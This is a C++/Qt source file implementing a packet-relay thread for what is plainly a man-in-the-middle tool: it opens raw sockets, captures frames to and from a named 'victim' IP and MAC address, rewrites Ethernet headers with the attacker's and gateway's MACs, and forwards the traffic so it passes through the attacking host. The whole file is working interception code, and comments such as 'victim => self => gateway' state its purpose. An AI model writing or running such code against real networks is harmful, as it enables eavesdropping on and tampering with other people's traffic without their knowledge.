#include <QDebug>

#include <cstdlib>
#include <cstdio>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if_arp.h>
#include <netinet/ip.h>

#include "global_define.h"
#include "getpacketsthread.h"

#include "ipresolver.h"
#include "hostinfo.h"


void GetPacketsThread::run()
{
    getPackets();
}

void GetPacketsThread::setVictimMacAddr(const QString &mac_addr)
{
    QStringList macs = mac_addr.split(":");
    qDebug() << "get mac address: " << mac_addr;
    for(int i = 0; i < macs.length(); i++){
        bool ok = true;
        victim_mac_addr[i] = macs.at(i).toShort(&ok, 16);
    }
}

void GetPacketsThread::setVictimIpAddr(const QString &ip_addr)
{
   this->victim_ip_addr = ip_addr;
}

void GetPacketsThread::getPackets()
{
    //To receive ip packets, we need a fd and a sockaddr_ll
    int victim_fd = -1;
    struct sockaddr_ll eth_info;
    memset(&eth_info, 0, sizeof(eth_info));

    eth_info.sll_family = PF_PACKET;
    eth_info.sll_ifindex = if_nametoindex(NIC_NAME);
    eth_info.sll_protocol = htons(ETH_P_IP);

    victim_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));\
    if(bind(victim_fd, (struct sockaddr*)(&eth_info), sizeof(eth_info))){
        perror("bind");
        return;
    }

    //To resend ip packets, we need a socket connected with gateway
    int gateway_fd = -1;
//    char xiaomi_mac[] = {0x94, 0xDB, 0xC9, 0x07, 0x5E, 0xC4};

    struct sockaddr_ll eth_gateway_info;

    memset(&eth_gateway_info, 0, sizeof(eth_gateway_info));
    eth_gateway_info.sll_family = PF_PACKET;
    eth_gateway_info.sll_ifindex = if_nametoindex(NIC_NAME);
    eth_gateway_info.sll_halen = ETH_ALEN;
    eth_gateway_info.sll_pkttype = PACKET_HOST;
    eth_gateway_info.sll_protocol = htons(ETH_P_IP);
    eth_gateway_info.sll_hatype = ARPHRD_ETHER;
    for(int i = 0; i < ETH_ALEN; i++){
        eth_gateway_info.sll_addr[i] = victim_mac_addr[i];
    }

    gateway_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(bind(gateway_fd, (struct sockaddr*)(&eth_gateway_info), sizeof(eth_gateway_info))){
        perror("bind");
        return;
    }

    char packet_buf[ETH_FRAME_LEN] = {0};
    char send_packet_buf[ETH_FRAME_LEN] = {0};
    int received_num = 0;

    struct ip *ip_packet = (struct ip*)&(send_packet_buf[ETH_ALEN + ETH_ALEN + 2]);
    struct ethhdr *eth_hdr = (struct ethhdr*)&send_packet_buf;

    struct sockaddr_ll client;
    socklen_t len = sizeof(client);
    while((received_num = recvfrom(victim_fd, packet_buf, sizeof(packet_buf), 0,
                                   (struct sockaddr*)&client, &len)) > 0){
//        QFile f("/tmp/ss.pcap");
//        f.open(QIODevice::WriteOnly);
//        f.write(buf, num);
//        f.close();

        memcpy(send_packet_buf, packet_buf, received_num);

        char src[50], dest[50];
        inet_ntop(AF_INET, &ip_packet->ip_src, src, sizeof(src));
        inet_ntop(AF_INET, &ip_packet->ip_dst, dest, sizeof(dest));

        //victim => self => gateway
        if(strncmp(src, victim_ip_addr.toLatin1().data(),
                   strlen(victim_ip_addr.toLatin1().data())) == 0){
            qDebug() << "Received " << received_num << " bytes. "
                     << src << " => " << dest << " protocol: " << ip_packet->ip_p;
            for(int i = 0; i < ETH_ALEN; i++){
                eth_hdr->h_dest[i] = HostInfo::gateway_mac[i];
                eth_hdr->h_source[i] = HostInfo::self_mac[i];
            }
        }//outside => self => victim
        else if(strncmp(dest, victim_ip_addr.toLatin1().data(),
                             strlen(victim_ip_addr.toLatin1().data())) == 0){
            qDebug() << "From server Received " << received_num << " bytes. "
                     << src << " => " << dest << " protocol: " << ip_packet->ip_p;
            for(int i = 0; i < ETH_ALEN; i++){
                eth_hdr->h_dest[i] = HostInfo::victim_mac[i];
                eth_hdr->h_source[i] = HostInfo::self_mac[i];
            }
        }
        int num = 0;
        if((num = sendto(gateway_fd, send_packet_buf, received_num, 0,
                         (struct sockaddr*)&eth_gateway_info, sizeof(eth_gateway_info))) < 0){
            perror("redirct send");
            return;
        }
    }
    close(victim_fd);
    close(gateway_fd);
}
